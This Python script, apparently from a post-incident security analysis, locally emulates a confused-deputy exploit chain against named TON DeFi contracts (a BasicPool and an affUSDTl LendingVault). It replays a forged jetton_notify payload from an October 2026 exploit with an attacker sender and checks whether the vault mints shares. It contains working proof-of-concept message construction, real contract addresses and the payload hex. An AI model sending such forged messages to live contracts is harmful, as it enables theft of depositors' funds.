#!/usr/bin/env python3
"""
DECISIVE live-path chain (READ-ONLY: lite reads + local TVM emulation).

1) Send a forged jetton_notify (op 0x7362d09c) to the VERIFIED BasicPool with
   sender = the affUSDTl LendingVault master (the body is the exact 2026-10-16
   exploit notify; src is swapped to an arbitrary wallet).
2) Extract the pool's relay message op 0xa1b21e8b to the vault.
3) Feed it to the vault; report whether the vault's share-accounting storage
   changes (a mint).
Plus: send the same 0xa1b21e8b directly to the vault from an arbitrary sender
(the vault must reject it -> proves the pool is the confused deputy).

Writes ci-out/ton_chain_results.json
"""
import base64, json, os, time
from tonpy.types import LiteClient, Address, Cell, CellBuilder, VmDict
from tonpy.tvm import Emulator
from tonpy.autogen.block import Account, ShardAccount

OUTDIR = os.environ.get("TON_EMU_OUT", os.path.join(os.path.dirname(__file__), "..", "ci-out"))
os.makedirs(OUTDIR, exist_ok=True)

BASICPOOL = "EQCrEHHG4Ff8TD3PzuH5tFSwHBD3zxeXaosz48jGLebwiiNx"
VAULT = "EQAGtgnr1G0XDilGURcOB3pUhl-Lo__J-TaJP0K4ey8cuSaW"     # affUSDTl master
VAULT_RAW = "0:06b609ebd46d170e294651170e077a54865f8ba3ffc9f936893f42b87b2f1cb9"
ATTACKER = "0:34461ba017e4799eeee0628521e505226ef405e087cabb765eb50a882e5550a2"
A1B = 0xa1b21e8b
# exact 2026-10-16 exploit jetton_notify body (public chain data), hex of its BOC
NOTIFY_HEX = "b5ee9c720101030100c800015c7362d09cbb14e99ff2a5367e08000d6c13d7a8da2e1c528ca22e1c0ef4a90cbf1747ff93f26d127e8570f65e39730101d18000d6c13d7a8da2e1c528ca22e1c0ef4a90cbf1747ff93f26d127e8570f65e39729000e9b1002c44ea652d4092859c67da44e4ca3add6565b0e2897d640a2c51bfb370d8877fa001219ddb12ab923340e8126cee139b187c5bdf01e5bf863e3e5cd42aa148a616102020051800486776c4aae48cd03a049b3b84e6c61f16f7c0796fe18f8f97350aa852298584e470de4df820001"

def coins(b, v):
    if v == 0: b.store_uint(0, 4); return
    nb = (v.bit_length() + 7) // 8
    b.store_uint(nb, 4); b.store_uint(v, nb * 8)

def _data(acc):
    if acc is None or not hasattr(acc, "storage"): return None
    stt = acc.storage.state
    if not hasattr(stt, "x"): return None
    d = stt.x.data
    return None if d is None else getattr(d, "value", d)
def data_of_account(c): return _data(Account().cell_unpack(c, rec_unpack=True))
def data_of_shard(c):
    sa = ShardAccount().cell_unpack(c, rec_unpack=True)
    return _data(sa.account if sa is not None else None)

def build_msg(src, dest, value_nano, body, lt, now):
    m = CellBuilder()
    m.store_bool(False); m.store_bool(True); m.store_bool(True); m.store_bool(False)
    m.store_address(Address(src)); m.store_address(Address(dest))
    coins(m, value_nano); m.store_bool(False); coins(m, 0); coins(m, 0)
    m.store_uint(lt, 64); m.store_uint(now, 32)
    m.store_bool(False); m.store_bool(True); m.store_ref(body)
    return m.end_cell()

def out_msgs_of(txcell):
    cs = txcell.begin_parse()
    cs.load_uint(4); cs.load_uint(256); cs.load_uint(64); cs.load_uint(256)
    cs.load_uint(64); cs.load_uint(32); cs.load_uint(15); cs.load_uint(2); cs.load_uint(2)
    aux = cs.load_ref(); acs = aux.begin_parse()
    if acs.load_bool(): acs.load_ref()
    out = []
    if not acs.load_bool(): return out
    d = VmDict(15, False, acs.load_ref())
    for k, v in d.get_iter():
        try: out.append(v.load_ref())
        except Exception: pass
    return out

def msg_op(msgcell):
    cs = msgcell.begin_parse()
    cs.load_uint(1); cs.load_bool(); cs.load_bool(); cs.load_bool()
    cs.load_address(); cs.load_address()
    cs.load_var_uint(16); cs.load_bool(); cs.load_var_uint(16); cs.load_var_uint(16)
    cs.load_uint(64); cs.load_uint(32)
    cs.load_bool()
    br = cs.load_bool()
    body = cs.load_ref() if br else cs
    bcs = body.begin_parse() if hasattr(body, "begin_parse") else body
    return bcs.preload_uint(32) if bcs.bits >= 32 else None

def retry(fn, n=8):
    last=None
    for _ in range(n):
        try: return fn()
        except Exception as e: last=e; time.sleep(1.5)
    raise last

def main():
    lc = LiteClient(mode="roundrobin", timeout=4, num_try=8)
    blk = retry(lambda: lc.get_masterchain_info_ext().last); now = lc.get_time()
    _, cfgraw = retry(lambda: lc.get_config_all(blk))
    cfg = VmDict(32)
    for k, cs in cfgraw.get_iter():
        if k != 43: cfg.set(k, cs)
    res = {"block_seqno": blk.id.seqno, "now": now}
    body = Cell(base64.b64encode(bytes.fromhex(NOTIFY_HEX)).decode())

    # 1) forged notify -> BasicPool
    st = retry(lambda: lc.get_account_state(Address(BASICPOOL), blk))
    lt = st.last_trans_lt + 1; ss = st.to_shard_state()
    em = Emulator(cfg); em.set_ignore_chksig(True)
    ok = em.emulate_transaction(ss, build_msg(ATTACKER, BASICPOOL, 1_500_000_000, body, lt, now), now, lt)
    outs = out_msgs_of(em.transaction.to_cell())
    relay = None
    for m in outs:
        if msg_op(m) == A1B: relay = m
    res["step1_pool_accepted_notify"] = bool(ok)
    res["step1_pool_relayed_0xa1b21e8b"] = relay is not None
    print(f"[1] BasicPool accepted forged notify={ok}, relayed 0xa1b21e8b={relay is not None}")
    if relay is None:
        json.dump(res, open(os.path.join(OUTDIR, "ton_chain_results.json"), "w"), indent=1); return

    # 2) relay -> vault
    st2 = retry(lambda: lc.get_account_state(Address(VAULT), blk))
    lt2 = st2.last_trans_lt + 1; ss2 = st2.to_shard_state()
    hb = data_of_account(ss2.begin_parse().load_ref()).get_hash()
    em2 = Emulator(cfg); em2.set_ignore_chksig(True)
    ok2 = em2.emulate_transaction(ss2, relay, now, lt2)
    da = data_of_shard(em2.account.to_cell())
    ha = da.get_hash() if da is not None else None
    res["step2_vault_storage_changed_from_pool"] = bool(ha != hb)
    print(f"[2] vault (relay from BasicPool) storage_changed={ha != hb}")

    # 3) same relay body straight from an arbitrary sender -> vault must reject
    rbody = None
    try:
        cs = relay.begin_parse()
        cs.load_uint(1); cs.load_bool(); cs.load_bool(); cs.load_bool()
        cs.load_address(); cs.load_address()
        cs.load_var_uint(16); cs.load_bool(); cs.load_var_uint(16); cs.load_var_uint(16)
        cs.load_uint(64); cs.load_uint(32); cs.load_bool()
        if cs.load_bool(): rbody = cs.load_ref()
    except Exception:
        rbody = None
    if rbody is not None:
        em4 = Emulator(cfg); em4.set_ignore_chksig(True)
        ok4 = em4.emulate_transaction(ss2, build_msg(ATTACKER, VAULT, 1_500_000_000, rbody, lt2, now), now, lt2)
        da4 = data_of_shard(em4.account.to_cell())
        ha4 = da4.get_hash() if da4 is not None else None
        res["step3_vault_storage_changed_from_attacker"] = bool(ha4 != hb)
        print(f"[3] vault (same body from arbitrary sender) storage_changed={ha4 != hb}")
    json.dump(res, open(os.path.join(OUTDIR, "ton_chain_results.json"), "w"), indent=1)
    print("wrote ton_chain_results.json")

if __name__ == "__main__":
    main()
